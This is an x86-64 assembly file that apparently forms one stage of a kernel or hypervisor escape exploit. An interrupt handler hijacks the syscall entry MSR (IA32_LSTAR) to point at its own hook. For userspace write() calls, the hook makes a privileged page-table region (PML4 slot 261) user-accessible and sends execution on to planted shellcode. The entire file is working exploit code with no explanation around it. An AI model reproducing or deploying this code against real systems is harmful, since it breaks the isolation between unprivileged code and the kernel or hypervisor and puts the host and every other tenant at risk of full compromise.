bits 64
default rel

; entry point for int 0x85

; read old MSR value
mov ecx, 0xc0000082 ; IA32_LSTAR
rdmsr
shl rdx, 32
xor rdx, rax
mov [orig_msr_value], rdx

; set new MSR value
mov ecx, 0xc0000082 ; IA32_LSTAR
lea rax, [diverted_syscall_entry]
mov rdx, rax
shr rdx, 32
wrmsr

; signal success to the caller
mov rax, 0x1337

; end of interrupt handler
iretq



diverted_syscall_entry:

cmp rax, 1 ; 64-bit __NR_write
jne goto_real_syscall_entry
; from here on, we can use rax as scratch register: we know it was 1

; are we coming from userspace at all? (check sign extension bit from guest RIP)
; note: this would also avoid re-diverting entry from write() inside the hook area
; (but we don't do that anyway)
mov rax, rcx
shr rax, 50
jc fixup_rax

; alright, a write syscall from userspace. this means we can probably also use
; r10, r8, r9 (and probably also other caller-saved registers).

; make PML4:261 guest-accessible
mov rax, cr3 ; physical address of PML4
mov r10, 0xffff830000000000
add rax, r10 ; virtual address of PML4
add rax, 8 * 261
or qword [rax], 0x7

; resume execution in the userspace shellcode after this syscall is over
; store original userspace RIP in R10
mov r10, rcx
mov rcx, 0xffff82d0c0002000

fixup_rax:
mov rax, 1
goto_real_syscall_entry:
jmp [orig_msr_value]



orig_msr_value: dq 0x0

